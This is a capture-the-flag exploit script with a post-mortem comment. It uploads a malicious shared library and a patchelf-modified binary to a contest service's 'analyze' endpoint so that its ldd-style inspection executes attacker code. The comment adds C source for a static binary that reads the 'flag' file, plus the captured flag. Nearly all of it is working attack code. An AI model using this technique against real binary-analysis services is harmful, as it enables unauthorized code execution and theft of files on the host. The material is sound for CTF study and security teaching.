"""
https://sourceware.org/bugzilla/show_bug.cgi?id=22851

compile a lib
upload lib
get lib path from output

compile binary that uses lib
upload binary
"""

import requests
import subprocess


subprocess.run(['make', 'clean'], check=True)
subprocess.run(['make', 'evil'], check=True)


s = requests.Session()

r = s.get('http://jiaware-1.play.hfsc.tf:12345')
url = 'http://jiaware-1.play.hfsc.tf:12345/analyze'

with s.post(url, files={'file': open('libevil.so', 'rb')}, stream=True) as r:
    for line in r.iter_lines():
        print(line)
        if b'/tmp/' in line:
            lib_path = line[line.index(b'/tmp'):line.rfind(b':')].decode()
            break
print('path', lib_path)

subprocess.run(['patchelf', '--replace-needed', 'libevil.so', lib_path, 'main'], check=True)

r = s.post(url, files={'file': open('main', 'rb')})
print(r.text)


"""
Post-mortem:

Apparently they didn't actually run it with ldd and instead just did LD_TRACE_LOADED_OBJECTS=1 ./<executable> :|

so uploading a static binary will just run it...


#include <stdio.h>
#include <stdlib.h>

int main()
{
    char buf[4096] = {0};
    FILE* fptr = fopen("flag", "r");
    fgets(buf, sizeof(buf), fptr);
    fclose(fptr);
    printf("%s\n", buf);
    return 0;
}


gcc a.c -o a -static

midnight{awWWw_y0u_f0uND_my_Fl4G}
"""
